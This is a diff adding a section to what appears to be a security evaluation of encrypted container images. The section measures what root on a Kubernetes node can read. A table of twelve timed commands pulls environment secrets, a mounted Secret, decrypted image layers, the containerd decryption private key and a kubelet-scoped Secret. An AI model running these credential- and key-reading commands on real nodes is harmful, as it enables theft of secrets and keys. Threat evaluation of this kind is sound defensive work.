@@ -292,6 +292,45 @@ The overhead is small. Cold pull and start on the keyed node, clean before every
 About 38 ms more to pull and 44 ms more to Ready, at this size. I only tested this one 10.9 MB
 image, so I don't know how the gap scales with multi-gigabyte layers.
 
+## 3. Root on the node
+
+The victim is the encrypted app on `supply-worker`, the node with the key, with
+`APP_SECRET=env-secret-value-77aa` in its environment and a Secret `db-creds` mounted at
+`/var/run/creds`. The attacker has a root shell on that node and nothing else: no kubeconfig, no
+registry credentials. Each step is one command, timed around `docker exec`
+(`scripts/30-node-root.sh`, output in `results/node-root/`):
+
+| # | What | Command (inside the node unless noted) | ms | Got |
+|---|---|---|---|---|
+| 1 | find the process | `crictl inspect --output go-template --template '{{.info.pid}}' $(crictl ps -q --label io.kubernetes.pod.name=victim)` | 83 | PID |
+| 2 | environment | `tr '\0' '\n' < /proc/$PID/environ` | 82 | `APP_SECRET=env-secret-value-77aa` |
+| 3 | mounted Secret | `cat /proc/$PID/root/var/run/creds/password` | 77 | `s3cr3t-db-password-4b1d` (a tmpfs, so memory, not disk; root reads it anyway) |
+| 4 | decrypted image, live | `head -c 31 /proc/$PID/root/opt/model/model.bin` | 73 | the marker |
+| 5 | decrypted image, on disk | `head -c 31 /var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/*/fs/opt/model/model.bin` | 53 | the marker, in `snapshots/243/fs` |
+| 6 | the decryption key | `cat /etc/containerd/ocicrypt/keys/enc-priv.pem` | 29 | a 3,272-byte RSA private key |
+| 7 | decrypt the registry copy | on the attacker's machine: `skopeo copy --decryption-key stolen.pem docker://…/app-enc:v1 dir:dec`, then grep | 155 | the marker |
+| 8 | process memory | on the host: `gcore` the app, `strings` the core | 7,406 | the env secret, 2 occurrences |
+| 9 | kubelet identity, mounted Secret | `kubectl --kubeconfig /etc/kubernetes/kubelet.conf -n enc get secret db-creds` | 121 | the password |
+| 10 | kubelet identity, other Secret | same, `unrelated-secret` | 87 | `Forbidden` |
+| 11 | kubelet identity, list | `get secrets -A` | 126 | `Forbidden` |
+| 12 | after `kubectl delete pod victim` | step 5 again | 54 | the marker, still on disk |
+
+All twelve took 8.3 seconds, 7.4 of them waiting for `gcore`.
+
+None of this is an exploit. It's the node doing its job. To run the container, containerd had
+to decrypt the layers, so plaintext sits in the snapshot directory for as long as the image is
+cached, not just while the pod runs. To decrypt them, the key had to be on the node, so root has
+it, and with it every copy of the image anywhere, including the "stolen registry" from part 2.
+The process has its secrets in its environment and memory because that's how it uses them.
+
+The one boundary that held is the Kubernetes API. The kubelet's credentials are confined by the
+Node authorizer to Secrets that pods on that node mount: `db-creds` yes, `unrelated-secret` and
+`list` no. So root on one node gets that node's workloads, its decryption keys and its pods'
+Secrets, not the cluster's.
+
+Signing didn't help here at all, and wasn't meant to. It answers "is this the image I built?",
+which is already settled by the time an attacker is reading `/proc`.
+
 ## Appendix A: Methodology
 
 - **Scope.** One Kind cluster on one 4-vCPU VM, a local plain-HTTP registry, a key-based cosign
